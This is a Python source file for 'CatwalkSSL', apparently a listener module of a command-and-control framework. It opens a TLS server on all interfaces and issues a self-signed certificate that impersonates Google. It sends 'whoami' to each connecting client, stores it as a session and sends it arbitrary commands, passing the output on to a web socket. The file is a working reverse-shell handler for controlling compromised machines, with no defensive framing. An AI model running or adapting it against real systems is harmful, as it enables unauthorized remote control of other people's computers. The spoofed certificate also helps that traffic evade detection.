import socket
import ssl
import subprocess
import secrets
import threading
import time

from core.printl import *
from managers.__base__ import BaseManager
from uuid import uuid4

def ouiSearch(mac:str):

    oui = ''.join(mac.split(":")[:3]).upper()

    if oui.lower() == "ffffff": return "broadcast" 

    with open("./core/ouis.txt", "r", encoding='utf-8') as f:
        for line in f:
            #print(line)
            soui, company = line.strip().split("=", 1)
            if soui == oui:
                return company
            
    return "unknown"

def cryptoRandom(length):
    s = ""
    letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for _ in range(length):
        a = secrets.randbelow(len(letters))
        s += letters[a]

    return s

connections = {}
cert, key, port = None, None, None

class CatwalkSSL(BaseManager):
    def startServer(websock,generatePassphrase=True,
                  _cert="./ssl/cert.pem", _key="./ssl/key.pem",
                    _port=9936) -> None:
        global cert, key, port, wsock, recievedData

        # SSL socket part
        passphrase = None
        cert = _cert
        key = _key
        port = _port

        if generatePassphrase:
            pwd = secrets.token_urlsafe(128)

            info("[SSL] [+] generating ssl certs..")
            subprocess.getoutput(' '.join(['openssl req -x509 -newkey rsa:4096 -keyout {}.pwd -out {} -days 365 -nodes -passin pass:{}'.format(key, cert, pwd),
                                 "-subj \"/C=US/ST=California/L=San Francisco/O=Google/CN=google.com\""]))
            
            subprocess.getoutput('openssl pkey -in {}.pwd -out {}'.format(key, key))
            info("[SSL] [+] done")

            passphrase = pwd

        wsock = websock
        recievedData = {}

        threading.Thread(target=CatwalkSSL.serverThread, daemon=True).start()

    def run(command:str, uuid:str, isAsync:bool) -> str:
        """Required."""
        global connections

        client = connections.get(uuid)

        if client == None:
            return "Client key \"{}\" is invalid.".format(uuid)
        
        recievedData[uuid] = None
        client["socket"].sendall((command+'\n').encode('ascii'))

        if isAsync:
            return True

        while recievedData[uuid] == None:
            time.sleep(.01)
        
        return recievedData[uuid].strip()
        
    def listening() -> tuple:
        """Required."""

        return server_socket.getsockname()

    def generateID() -> str:
        """Required."""
        return str(uuid4())

    def getConnections() -> dict:
        """Required."""
        global connections
        return connections

    def serverThread(host="0.0.0.0"):
        global port, cert, key, server_socket
        
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((host, port))
        server_socket.settimeout(5)
        server_socket.listen(5)

        def command(cs:socket.socket, cmd):
            cs.sendall(cmd.encode('ascii'))
            return cs.recv(16384).decode('ascii')

        while True:
            while True:
                try:
                    client_socket, addr = server_socket.accept()
                    ssl_client_socket = ssl.wrap_socket(client_socket, server_side=True,
                                                        certfile=cert, keyfile=key,
                                                        ssl_version=ssl.PROTOCOL_TLSv1_2)
                    break
                except:
                    time.sleep(.05)
                    continue
                
            data = command(ssl_client_socket, "whoami")
            if not data:
                break
            else:

                clientInfo = {
                    "ip": addr[0],
                    "socket": ssl_client_socket,
                    "run": CatwalkSSL.run
                }

                uid = CatwalkSSL.generateID()
                connections[uid] = clientInfo
                threading.Thread(target=CatwalkSSL.readThread, args=(ssl_client_socket, uid)).start()

    def readThread(sock:socket.socket,uuid:str):
        """auto read data from sock"""
        global recievedData, wsock

        recievedData[uuid] = []
        
        while True:
            try:
                data = sock.recv(16384).decode('ascii')
            except:
                warn("[SSL] {} disconnected".format(uuid))
                sock.close()
                return
            
            recievedData[uuid] = data
            wsock.emit('clientrx', {uuid: data}, namespace='/')
